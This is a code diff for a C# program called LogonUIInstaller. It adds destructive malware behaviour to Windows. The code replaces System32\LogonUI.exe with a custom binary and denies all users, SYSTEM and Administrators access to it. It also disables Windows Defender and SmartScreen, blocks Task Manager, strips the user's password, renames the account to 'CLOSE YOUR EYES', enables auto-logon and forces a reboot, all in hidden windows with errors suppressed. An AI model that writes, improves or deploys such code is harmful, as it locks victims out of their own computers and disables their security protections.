@@ -96,7 +96,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ЗАМЕНА LogonUI (БЕЗ ЖЁСТКОЙ БЛОКИРОВКИ) ====================
+        // ==================== ЗАМЕНА LogonUI (УСИЛЕННАЯ) ====================
         private static void ReplaceLogonUI()
         {
             try
@@ -104,16 +104,24 @@ namespace LogonUIInstaller
                 string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                 if (!File.Exists(originalPath)) return;
 
+                // 1. Полный доступ через takeown + icacls
                 ForceFullAccess(originalPath);
+                
+                // 2. Убиваем все процессы
                 KillLogonUIProcesses();
-                Thread.Sleep(1000);
-
+                Thread.Sleep(2000);
+                
+                // 3. Снимаем все атрибуты
                 File.SetAttributes(originalPath, FileAttributes.Normal);
-                for (int i = 0; i < 5; i++)
+                
+                // 4. Удаляем всеми способами
+                bool deleted = false;
+                for (int i = 0; i < 10; i++)
                 {
                     try
                     {
                         File.Delete(originalPath);
+                        deleted = true;
                         break;
                     }
                     catch
@@ -123,17 +131,62 @@ namespace LogonUIInstaller
                         {
                             File.Move(originalPath, originalPath + ".del");
                             File.Delete(originalPath + ".del");
+                            deleted = true;
                             break;
                         }
-                        catch { }
+                        catch
+                        {
+                            // Пробуем через cmd
+                            try
+                            {
+                                Process.Start(new ProcessStartInfo
+                                {
+                                    FileName = "cmd.exe",
+                                    Arguments = $"/c del /f /q \"{originalPath}\"",
+                                    CreateNoWindow = true,
+                                    WindowStyle = ProcessWindowStyle.Hidden,
+                                    UseShellExecute = false
+                                })?.WaitForExit(3000);
+                                deleted = true;
+                                break;
+                            }
+                            catch { }
+                        }
                     }
                 }
 
+                // 5. Если не удалили — пробуем через перемещение
+                if (!deleted)
+                {
+                    try
+                    {
+                        string tempPath = Path.Combine(Path.GetTempPath(), "LogonUI.exe.bak");
+                        File.Move(originalPath, tempPath);
+                        File.Delete(tempPath);
+                    }
+                    catch { }
+                }
+
+                // 6. Записываем кастомный LogonUI
                 byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                 File.WriteAllBytes(originalPath, customLogonUI);
-
-                // Только ReadOnly + Hidden (без жёсткой блокировки)
-                File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
+                
+                // 7. Делаем скрытым и защищённым
+                File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
+                
+                // 8. Блокируем доступ (чтобы нельзя было удалить)
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "icacls.exe",
+                        Arguments = $"\"{originalPath}\" /deny Everyone:F /deny SYSTEM:F /deny Administrators:F",
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = false
+                    })?.WaitForExit(3000);
+                }
+                catch { }
             }
             catch { }
         }
@@ -154,6 +207,7 @@ namespace LogonUIInstaller
         private static void ForceFullAccess(string path)
         {
             try { File.SetAttributes(path, FileAttributes.Normal); } catch { }
+            
             try
             {
                 Process p = Process.Start(new ProcessStartInfo
@@ -164,24 +218,26 @@ namespace LogonUIInstaller
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
-                p?.WaitForExit(3000);
+                p?.WaitForExit(5000);
                 p?.Close();
             }
             catch { }
+
             try
             {
                 Process p = Process.Start(new ProcessStartInfo
                 {
                     FileName = "icacls.exe",
-                    Arguments = $"\"{path}\" /grant Everyone:F",
+                    Arguments = $"\"{path}\" /grant Everyone:F /grant SYSTEM:F /grant Administrators:F",
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
-                p?.WaitForExit(3000);
+                p?.WaitForExit(5000);
                 p?.Close();
             }
             catch { }
+
             try
             {
                 FileInfo fi = new FileInfo(path);
@@ -193,6 +249,9 @@ namespace LogonUIInstaller
                 fs.AddAccessRule(new FileSystemAccessRule(
                     new NTAccount("NT AUTHORITY\\SYSTEM"),
                     FileSystemRights.FullControl, AccessControlType.Allow));
+                fs.AddAccessRule(new FileSystemAccessRule(
+                    new NTAccount("BUILTIN\\Administrators"),
+                    FileSystemRights.FullControl, AccessControlType.Allow));
                 fi.SetAccessControl(fs);
             }
             catch { }
@@ -202,6 +261,7 @@ namespace LogonUIInstaller
         {
             try
             {
+                // Через .NET
                 foreach (Process p in Process.GetProcessesByName("LogonUI"))
                 {
                     try
@@ -210,17 +270,71 @@ namespace LogonUIInstaller
                             p.MainModule.FileName.Contains("System32"))
                         {
                             p.Kill();
-                            p.WaitForExit(3000);
+                            p.WaitForExit(5000);
                             Thread.Sleep(500);
                         }
                     }
                     catch { }
                 }
+                
+                // Через taskkill
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "taskkill",
+                        Arguments = "/f /im LogonUI.exe",
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = false
+                    })?.WaitForExit(3000);
+                }
+                catch { }
             }
             catch { }
         }
 
-        // ==================== ВСЕ БЛОКИРОВКИ (ВСТРОЕНЫ) ====================
+        // ==================== УСТАНОВЩИК ====================
+        private static bool IsElevated()
+        {
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        private static void RestartAsAdmin()
+        {
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = Assembly.GetEntryAssembly().Location,
+                    Verb = "runas",
+                    UseShellExecute = true,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+            }
+            catch { }
+            Environment.Exit(0);
+        }
+
+        private static void ForceReboot()
+        {
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "shutdown",
+                    Arguments = "/r /f /t 0",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+            Environment.Exit(0);
+        }
+
+        // ==================== ВСЕ БЛОКИРОВКИ ====================
         private static void ApplyAllLocks()
         {
             // Блокировка Task Manager
@@ -353,6 +467,20 @@ namespace LogonUIInstaller
 
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                     key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
+
+                // Дополнительно отключаем Defender
+                try
+                {
+                    using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
+                    {
+                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
+                        key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
+                        key.SetValue("DisableBlockAtFirstSeen", 1, RegistryValueKind.DWord);
+                        key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
+                        key.SetValue("DisableAntiVirus", 1, RegistryValueKind.DWord);
+                    }
+                }
+                catch { }
             }
             catch { }
         }
@@ -456,7 +584,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ПЕРЕИМЕНОВАНИЕ ====================
+        // ==================== ПЕРЕИМЕНОВАНИЕ (ИСПРАВЛЕННОЕ) ====================
         private static void RenameCurrentUserFixed()
         {
             try
@@ -464,6 +592,7 @@ namespace LogonUIInstaller
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
+                // 1. Убираем пароль
                 Process p0 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -475,6 +604,7 @@ namespace LogonUIInstaller
                 p0?.WaitForExit(3000);
                 p0?.Close();
 
+                // 2. Переименовываем через wmic (работает в Windows 10)
                 Process p1 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "wmic",
@@ -486,14 +616,32 @@ namespace LogonUIInstaller
                 p1?.WaitForExit(5000);
                 p1?.Close();
 
+                // 3. Ждём применения
+                Thread.Sleep(2000);
+
+                // 4. Переименовываем папку профиля
                 string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
                 string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
 
                 if (Directory.Exists(oldProfilePath) && !Directory.Exists(newProfilePath))
                 {
-                    try { Directory.Move(oldProfilePath, newProfilePath); } catch { }
+                    try
+                    {
+                        Directory.Move(oldProfilePath, newProfilePath);
+                    }
+                    catch
+                    {
+                        // Если не получается — копируем
+                        try
+                        {
+                            CopyDirectory(oldProfilePath, newProfilePath, true);
+                            Directory.Delete(oldProfilePath, true);
+                        }
+                        catch { }
+                    }
                 }
 
+                // 5. Обновляем путь в реестре
                 string sid = GetUserSID(newUser);
                 if (!string.IsNullOrEmpty(sid))
                 {
@@ -504,6 +652,7 @@ namespace LogonUIInstaller
                     }
                 }
 
+                // 6. Active Setup (гарантия)
                 string guid = Guid.NewGuid().ToString("B").ToUpper();
                 using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                 {
@@ -512,6 +661,7 @@ namespace LogonUIInstaller
                     key.SetValue("Version", "1.0", RegistryValueKind.String);
                 }
 
+                // 7. Автоматический вход
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                 {
                     key.SetValue("AutoAdminLogon", "1", RegistryValueKind.String);
@@ -520,6 +670,21 @@ namespace LogonUIInstaller
                 }
             }
             catch { }
+        }
+
+        private static void CopyDirectory(string sourceDir, string destDir, bool overwrite)
+        {
+            Directory.CreateDirectory(destDir);
+            foreach (string file in Directory.GetFiles(sourceDir))
+            {
+                string destFile = Path.Combine(destDir, Path.GetFileName(file));
+                File.Copy(file, destFile, overwrite);
+            }
+            foreach (string dir in Directory.GetDirectories(sourceDir))
+            {
+                string destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
+                CopyDirectory(dir, destSubDir, overwrite);
+            }
         }
 
         private static string GetUserSID(string username)
@@ -576,43 +741,22 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static bool IsElevated()
-        {
-            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
-        }
-
-        private static void RestartAsAdmin()
+        private static void RunCommand(string fileName, string arguments)
         {
             try
             {
-                Process.Start(new ProcessStartInfo
+                Process p = Process.Start(new ProcessStartInfo
                 {
-                    FileName = Assembly.GetEntryAssembly().Location,
-                    Verb = "runas",
-                    UseShellExecute = true,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-            }
-            catch { }
-            Environment.Exit(0);
-        }
-
-        private static void ForceReboot()
-        {
-            try
-            {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "shutdown",
-                    Arguments = "/r /f /t 0",
+                    FileName = fileName,
+                    Arguments = arguments,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = false
                 });
+                p?.WaitForExit(5000);
+                p?.Close();
             }
             catch { }
-            Environment.Exit(0);
         }
     }
 }
